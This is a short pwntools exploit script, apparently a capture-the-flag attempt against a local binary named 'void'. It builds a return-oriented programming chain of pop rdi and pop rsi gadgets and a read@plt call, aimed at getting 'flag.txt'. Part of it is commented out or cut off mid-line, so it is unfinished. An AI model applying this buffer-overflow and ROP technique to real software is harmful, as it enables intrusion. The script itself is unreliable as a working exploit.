#!/bin/python3

from pwn import *

elf = context.binary = ELF('./void', checksec= False)


"""bss  = pack(0x0000000000404030)
qword = pack(0x000000000040113f)
pop_r14_r15 = pack(0x00000000004011b8)
rdi = pack(0x00000000004011bb)

payload = b'A'*72
payload += pop_r14_r15
payload += b'flag.txt'
payload += bss"""

payload = cyclic(40)

# Step 2: Set up arguments for read@plt
# Set RDI (file descriptor = 0 for stdin)
payload += pack(0x4011bb)  # pop rdi gadget
payload += pack(0)         # stdin file descriptor

# Set RSI (buffer = writable memory location)
payload += pack(0x4011b9)  # pop rsi; pop r15; ret gadget
payload += pack(0x404000)  # Writable buffer address
payload += pack(0)         # Junk for r15

# Set RDX (number of bytes to read = 64)
"""payload += pack(0x401203)  # pop rdx gadget
payload += pack(0x40"""   # Number of bytes to read

# Call read@plt
payload += pack(0x401030)  # Address of read@plt

# Send payload
io = process()
io.sendline(payload)

# Redirect stdin to `flag.txt` (simulate with shell redirection)
io.sendline(b'flag.txt\n')
io.interactive()


io = process()

